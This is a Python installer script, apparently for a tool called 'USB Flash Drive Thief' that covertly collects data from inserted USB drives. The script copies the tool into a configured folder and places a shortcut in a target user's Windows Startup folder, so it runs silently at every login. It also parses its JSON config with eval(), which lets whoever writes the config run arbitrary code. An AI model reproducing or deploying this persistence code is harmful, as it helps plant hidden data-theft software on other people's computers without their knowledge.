import os
import re
import shutil
import win32com.client as client

print("""
U盘小偷安装器_alpha1.1
      
作者  : Spruce_leaves_
源代码: https://github.com/Spruce-Leaves/USBFlashDriveThief
    
免责声明 : 严禁将此程序及其内容用于任何商业或非法用途。对于因违反此规定而产生的任何法律后果，用户需自行承担全部责任。
--------------------------

output:
""")


installMainPath = "\\".join(__file__.split("\\")[:-1])
    
exists = os.path.exists
listDir = os.listdir
pJoin = os.path.join





def getConfig(name):
    #name = "UPanThief.json"
    if name not in os.listdir():   #如果工作目录下没有配置文件
        with open(file = name, mode = "w+", encoding = "utf8") as fo:   #就创建配置文件并填充格式
            fo.write("""{\n    "mainPath" : "",\n    "dataPath" : "",\n    "targetUsers" : "",\n    "mainName" : "",\n    "configName" : ""\n}""")
            print("NO file")
        return ("", "", "", "", "")
    
    else:   #如果工作目录下有配置文件
        with open(file = name, mode = "r", encoding = "utf8") as fo:   #就开始读取

            def dirDispose(rawData: str) -> str:
                for fh in ["\\", "/"]:
                    rawData:list[str] = rawData.split(fh)

                    i = 0
                    while True:
                        strObj = rawData[i]

                        if  strObj == "" or strObj.isspace():   #如果字符串为空或只有空格
                            rawData.pop(i)                          #就去掉
                        else:
                            i += 1
                        if i >= len(rawData):
                            break

                    rawData = "/".join(rawData)
                
                return rawData


            def formatEnv(strObj: str, envDict: dict) -> str:
                strList = re.split("({\w+})", strObj)

                for index_ in range(len(strList)):
                    subStr = strList[index_]
                    if subStr == "" or subStr.isspace() or len(subStr) <= 2:   #如果该字符串为空 或 只有空格 或 长度小于2
                        continue

                    elif (subStr[0] == "{" and subStr[-1] == "}") and\
                                                                    \
                        (subStr[1: -1] in envDict.keys()):   #如果该字符串符合环境变量的格式 且 对应的环境变量 在 环境变量列表 内

                        strList[index_] = "/".join(envDict[subStr[1: -1]].split("\\"))            #就替换为对应的环境变量的值


                strObj2 = "".join(strList)


                return strObj2



            envDict = {"WINDIR": os.getenv("WINDIR"), 
                       "APPDATA": os.getenv("APPDATA"), 
                       "USERPROFILE": os.getenv("USERPROFILE"), 
                       "SYSTEMDRIVE": os.getenv("SYSTEMDRIVE"), 
                       "COMPUTERNAME": os.getenv("COMPUTERNAME")}


            data = dirDispose(fo.read())
            data = formatEnv(data, envDict)
            data = "".join(data.split("\n"))
            data = eval(data)

            mainPath = data["mainPath"]
            dataPath = data["dataPath"]
            mainName = data["mainName"]
            dependList = data["dependList"]
            targetUsers = data["targetUsers"]


            if targetUsers == "/".join(os.getenv("USERPROFILE").split("\\")):   #如果是目标用户的目录路径
                startPath = targetUsers + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"

            else:                                 #如果是用户名
                startPath = "/".join(os.getenv("SYSTEMDRIVE").split("\\")) + "/Users/" + targetUsers + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"



        return (mainPath, dataPath, startPath, mainName, dependList)



def makeLink(path, targetPath=""):   #path, target, args='', icon=',0'
    shell = client.Dispatch('Wscript.Shell')
    link = shell.CreateShortCut(path)
    #link.TargetPath = target
    #link.Arguments = args
    #link.IconLocation = icon
    link.TargetPath = targetPath
    link.WorkingDirectory = targetPath.split("\\")[0]
    link.save()
    print(dir(link))




def main():
    name = "install.json"
    data = getConfig(name)

    MAINPATH = data[0]
    DATAPATH = data[1]
    STARTPATH = data[2]
    MAINNAME = data[3]
    DEPENDLIST = data[4]
    for s in zip(["安装路径    ", "数据存放路径", "自启动目录  ", "主程序文件名", "依赖文件名  " ], [MAINPATH, DATAPATH, STARTPATH, MAINNAME, DEPENDLIST]):
        print("{}: {}".format(s[0], s[1]))


    for i in (MAINPATH, DATAPATH):
        if exists(i) == False:                  #如果完整的路径不存在
            print("路径不存在: {}".format(i))
            for j in range(1, len(i.split("/")) + 1):   #就递归(迫真)创建文件夹
                path = "/".join(i.split("/")[0:j])
                print(path)
                if exists(path) ==False:
                    os.mkdir(path)
                    print("创建文件夹: {}".format(path))
                else:
                    pass
        else:
            pass

    dirList = listDir(MAINPATH)
    for fileName in dirList:
        if "UPanThief" in fileName:
            os.remove(pJoin(MAINPATH, fileName))


    for i in (MAINNAME, ) + tuple(DEPENDLIST):   #复制文件
        if i in listDir(MAINPATH):
            os.remove(pJoin(MAINPATH, i))
            print("删除已有文件: {}".format(pJoin(MAINPATH, i)))
        else:
            pass
        shutil.copy(i, MAINPATH)
        print("复制文件: {}".format((i, MAINPATH)))

    makeLink(MAINNAME + ".lnk", pJoin(MAINPATH, MAINNAME))

    if MAINNAME + ".lnk" in listDir(STARTPATH):   #复制快捷方式到开机自启动目录
        os.remove(pJoin(STARTPATH, MAINNAME + ".lnk"))
    else:
        pass

    shutil.copy(MAINNAME + ".lnk", STARTPATH)


if __name__ == "__main__":
    main()